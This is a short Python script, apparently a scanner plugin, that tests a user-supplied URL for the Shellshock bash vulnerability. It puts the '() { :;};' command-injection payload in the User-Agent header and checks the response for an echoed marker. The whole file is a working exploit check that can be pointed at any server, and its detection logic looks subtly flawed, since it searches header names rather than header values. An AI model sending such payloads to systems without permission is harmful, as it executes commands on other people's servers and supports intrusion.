#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: shellshock漏洞
referer: http://drops.wooyun.org/papers/3268
author: Lucifer
description: 在bash 1.14至bash 4.3的Linux/Unix系统版本中，bash在处理某些构造的环境变量时存在安全漏洞，
向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行任意的shell命令,甚至完全控制目标系统
'''
import sys
import requests

class shellshock_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-agent":'() { :;}; echo \"Shellshock: Server Vulnerable\"',
            "Accept":"text/plain",
            "Content-type":"application/x-www-form-urlencoded"
        }
        payload = ""
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)

            if r"Shellshock" in req.headers:
                return "[+]存在shellshock漏洞...(高危)\tpayload: "+vulnurl
            else:
                return "[-]no vuln"
        except:
            return "[-] ======>连接超时"

if __name__ == "__main__":
    testVuln = shellshock_BaseVerify(sys.argv[1])
    testVuln.run()
